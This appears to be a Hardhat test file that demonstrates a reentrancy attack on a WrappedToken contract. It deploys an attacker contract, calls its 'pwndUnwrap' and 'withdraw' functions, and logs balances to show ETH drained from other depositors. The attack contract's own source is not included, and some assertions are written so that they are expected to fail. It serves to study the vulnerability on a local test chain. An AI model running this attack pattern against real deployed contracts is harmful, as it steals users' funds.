import { expect } from "chai";
import hre from "hardhat";

describe("WrappedToken Reentrancy Attack", function () {
    // test variables
    let wrappedToken: any;
    let attackContract: any;
    let deployer: any;
    let user1: any; // malicious attacker
    let user2: any;
    let user3: any;

    before(async function () {
        [deployer, user1, user2, user3] = await hre.ethers.getSigners();
        
        // Deploy WrappedToken
        const WrappedTokenFactory = await hre.ethers.getContractFactory("WrappedToken");
        wrappedToken = await WrappedTokenFactory.deploy("Wrapped Ether", "WETH");
        await wrappedToken.waitForDeployment();

        // Deploy AttackWrappedToken
        const AttackWrappedTokenFactory = await hre.ethers.getContractFactory("AttackWrappedToken");
        attackContract = await AttackWrappedTokenFactory.connect(user1).deploy(wrappedToken.target);
        await attackContract.waitForDeployment();
    });

    it("should deploy the token with 0 total supply", async function () {
        expect(await wrappedToken.totalSupply()).to.equal(0);
    });

    it("should allow any address to wrap tokens", async function () {
        const wrapAmount = hre.ethers.parseEther("1.0");
        
        // Deployer wraps
        const wrapTx = await wrappedToken.wrap({ value: wrapAmount });
        await wrapTx.wait();
        expect(await wrappedToken.balanceOf(deployer.address)).to.equal(wrapAmount);

        // User1 (attacker) wraps
        const wrap2Tx = await wrappedToken.connect(user1).wrap({ value: wrapAmount });
        await wrap2Tx.wait();
        expect(await wrappedToken.balanceOf(user1.address)).to.equal(wrapAmount);

        // User2 wraps
        const wrap3Tx = await wrappedToken.connect(user2).wrap({ value: wrapAmount });
        await wrap3Tx.wait();
        expect(await wrappedToken.balanceOf(user2.address)).to.equal(wrapAmount);

        // User3 wraps
        const wrap4Tx = await wrappedToken.connect(user3).wrap({ value: wrapAmount });
        await wrap4Tx.wait();
        expect(await wrappedToken.balanceOf(user3.address)).to.equal(wrapAmount);

        expect(await wrappedToken.totalSupply()).to.equal(wrapAmount * 4n);
    });

    it("should demonstrate reentrancy attack during unwrap", async function () {
        const unwrapAmount = hre.ethers.parseEther("1");
        const startingWrappedEther = await hre.ethers.provider.getBalance(wrappedToken.target);

        // Attacker transfers tokens to attack contract
        const transferTx = await wrappedToken.connect(user1).transfer(attackContract.target, unwrapAmount);
        await transferTx.wait();
        expect(await wrappedToken.balanceOf(attackContract.target)).to.equal(unwrapAmount);

        // Attacker executes reentrancy attack IMMEDIATELY
        console.log("=== STARTING ATTACK ===");
        console.log("Attack contract token balance before:", await wrappedToken.balanceOf(attackContract.target));
        console.log("WrappedToken ETH balance before:", await hre.ethers.provider.getBalance(wrappedToken.target));
        console.log("Attack contract ETH balance before:", await hre.ethers.provider.getBalance(attackContract.target));
        console.log("Attacker ETH balance before:", await hre.ethers.provider.getBalance(user1.address));
        
        try {
            const attackTx = await attackContract.connect(user1).pwndUnwrap(unwrapAmount);
            console.log("Attack transaction hash:", attackTx.hash);
            
            // Wait for the transaction and get the receipt
            const receipt = await attackTx.wait();
            console.log("Attack transaction completed!");
            console.log("Gas used:", receipt.gasUsed.toString());
            console.log("Status:", receipt.status);
            
            // Check for reentrant call events
            const logs = receipt.logs;
            console.log("Number of logs:", logs.length);
            
        } catch (error: any) {
            console.log("Attack failed with error:", error.message);
            console.log("Error details:", error);
        }
        
        console.log("=== AFTER ATTACK ===");
        console.log("Attack contract token balance after:", await wrappedToken.balanceOf(attackContract.target));
        console.log("WrappedToken ETH balance after:", await hre.ethers.provider.getBalance(wrappedToken.target));
        console.log("Attack contract ETH balance after:", await hre.ethers.provider.getBalance(attackContract.target));
        console.log("Attacker ETH balance after:", await hre.ethers.provider.getBalance(user1.address));

        // Attacker withdraws stolen funds
        const withdrawTx = await attackContract.connect(user1).withdraw();
        await withdrawTx.wait();

        // Now other users try to unwrap (but attacker already stole their funds!)
        const unwrapTx = await wrappedToken.unwrap(unwrapAmount);
        await unwrapTx.wait();

        expect(await wrappedToken.balanceOf(user1.address)).to.equal(0);
        expect(await wrappedToken.totalSupply()).to.be.lessThan(startingWrappedEther); // should fail since attacker stole ETH
        console.log("WrappedToken total supply after:", await wrappedToken.totalSupply());
        console.log("WrappedToken ETH balance after:", await hre.ethers.provider.getBalance(wrappedToken.target));
        console.log("Expected WrappedToken ETH balance:", hre.ethers.formatEther(startingWrappedEther - unwrapAmount * 2n));

        const unwrap2Tx = await wrappedToken.connect(user2).unwrap(unwrapAmount);
        await unwrap2Tx.wait();

        expect(await wrappedToken.balanceOf(user2.address)).to.equal(0);
        expect(await wrappedToken.totalSupply()).to.be.lessThan(startingWrappedEther); // should fail since attacker stole ETH
        console.log("WrappedToken total supply after:", await wrappedToken.totalSupply());
        console.log("WrappedToken ETH balance after:", await hre.ethers.provider.getBalance(wrappedToken.target));
        console.log("Expected WrappedToken ETH balance:", hre.ethers.formatEther(startingWrappedEther - unwrapAmount * 3n));

        const unwrap3Tx = await wrappedToken.connect(user3).unwrap(unwrapAmount);
        await unwrap3Tx.wait();

        expect(await wrappedToken.balanceOf(user3.address)).to.equal(0);
        expect(await wrappedToken.totalSupply()).to.be.lessThan(startingWrappedEther); // should fail since attacker stole ETH
        console.log("WrappedToken total supply after:", await wrappedToken.totalSupply());
        console.log("WrappedToken ETH balance after:", await hre.ethers.provider.getBalance(wrappedToken.target));
        console.log("Expected WrappedToken ETH balance:", hre.ethers.formatEther(startingWrappedEther - unwrapAmount * 4n));

        // Check balances after attack
        const finalWrappedEther = await hre.ethers.provider.getBalance(wrappedToken.target);
        const attackerBalance = await hre.ethers.provider.getBalance(user1.address);

        console.log("Starting WrappedToken ETH balance:", hre.ethers.formatEther(startingWrappedEther));
        console.log("Final WrappedToken ETH balance:", hre.ethers.formatEther(finalWrappedEther));
        console.log("Attacker ETH balance:", hre.ethers.formatEther(attackerBalance));

        // The attack should fail these assertions because the attacker stole more ETH than they should have
        // This demonstrates the reentrancy vulnerability
        expect(finalWrappedEther).to.equal(0n); // This should fail - attacker stole ETH
        expect(await wrappedToken.totalSupply()).to.equal(0n); // This should fail - tokens weren't properly burned
    });
}); 